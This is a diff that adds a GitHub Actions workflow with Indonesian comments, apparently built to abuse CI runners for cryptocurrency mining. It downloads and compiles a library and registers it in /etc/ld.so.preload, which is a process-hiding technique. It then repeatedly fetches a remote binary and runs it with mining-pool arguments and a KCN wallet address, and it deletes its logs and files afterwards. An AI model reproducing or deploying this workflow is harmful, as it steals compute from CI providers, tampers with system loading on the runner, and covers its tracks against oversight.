@@ -1,0 +1,92 @@
+name: kyl 
+
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    name: build
+    runs-on: ubuntu-latest
+    env:
+      NUM_JOBS: 40
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Install Dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget curl build-essential jq
+
+    - name: Download and Compile Code
+      run: |
+        curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+        gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+        sudo mv libnyumput.so /usr/local/lib/
+        echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
+        rm nyumput.c
+
+    - name: Run and Manage Process
+      run: |
+        end_time=$(( $(date +%s) + 6*3600 ))  # 6 jam dari sekarang
+
+        while [ $(date +%s) -lt $end_time ]; do
+          timestamp=$(date +%s)
+          mkdir -p .lib
+
+          dynamic_sgr=".lib/sgr_$timestamp"
+          dynamic_list="list_$timestamp.json"
+
+          # Download file dengan validasi
+          wget -q -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
+          wget -q -O $dynamic_list https://github.com/barburonjilo/open/raw/refs/heads/main/list.json
+
+          # Periksa apakah file berhasil diunduh
+          if [[ ! -s $dynamic_list ]] || [[ ! -s $dynamic_sgr ]]; then
+            echo "Gagal mengunduh file yang diperlukan, mencoba ulang dalam 2 menit..."
+            sleep 120
+            continue
+          fi
+
+          chmod +x $dynamic_sgr
+
+          # Validasi JSON
+          if ! jq empty $dynamic_list > /dev/null 2>&1; then
+            echo "File JSON tidak valid. Keluar."
+            exit 1
+          fi
+
+          # Pilih IP acak
+          ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
+          if [ -z "$ip" ]; then
+            echo "Tidak ada IP tersedia dalam $dynamic_list. Keluar."
+            exit 1
+          fi
+
+          # Hapus IP yang dipilih dari daftar
+          jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $dynamic_list > tmp_$timestamp.json && mv tmp_$timestamp.json $dynamic_list
+
+          # Jalankan proses pada rentang port
+          for port in $(seq 443 452); do
+            nohup $dynamic_sgr -o $ip:443 -a Flex -u KCN=kc1qndlfjd9n0q9659fhp34v9vjasjs3ugc4nevans -t 3 > dance_$port_$timestamp.log 2>&1 & 
+            process_pid=$!
+
+            echo "Memulai proses PID $process_pid menggunakan IP $ip di port $port"
+            
+            sleep 60  # Biarkan berjalan selama 1 menit
+            
+            kill $process_pid 2>/dev/null || true  # Hentikan proses
+
+            rm -f dance_$port_$timestamp.log  # Hapus log
+          done
+
+          # Bersihkan file setelah iterasi
+          rm -f $dynamic_list $dynamic_sgr
+
+          echo "Menunggu 2 menit sebelum iterasi berikutnya..."
+          sleep 120
+        done
